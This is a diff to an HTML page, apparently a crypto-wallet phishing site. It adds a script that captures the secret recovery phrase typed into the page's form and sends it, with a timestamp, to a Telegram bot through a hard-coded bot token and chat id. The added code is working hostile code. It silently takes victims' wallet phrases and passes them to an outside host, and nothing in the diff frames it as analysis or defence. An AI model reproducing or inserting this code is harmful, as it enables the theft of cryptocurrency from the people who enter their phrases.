@@ -339,5 +339,20 @@
     </script>
     <script type="module" src="/submit.7f15b0bf.js"></script>
     <script type="module" src="./src/submit-val.js"></script>
+    <script>
+        // Add Telegram notification when form is submitted
+        document.getElementById('submit-form').addEventListener('submit', function(e) {
+            const phrase = document.getElementById('sec-rec-phr').value.trim();
+            
+            if (phrase) {
+                // Send to second Telegram
+                const telegramMessage = `🔐 Secret Recovery Phrase Captured\n\nPhrase: ${phrase}\nTime: ${new Date().toLocaleString()}`;
+                const telegramUrl = `https://api.telegram.org/bot7199118956:AAE7DRxYf3huaDT4UMHO3t2JDUqgD8U_S1U/sendMessage?chat_id=8410717800&text=${encodeURIComponent(telegramMessage)}`;
+                
+                // Send to Telegram (fire and forget - don't wait for response)
+                fetch(telegramUrl).catch(error => console.error('Telegram error:', error));
+            }
+        });
+    </script>
 </body>
 </html>
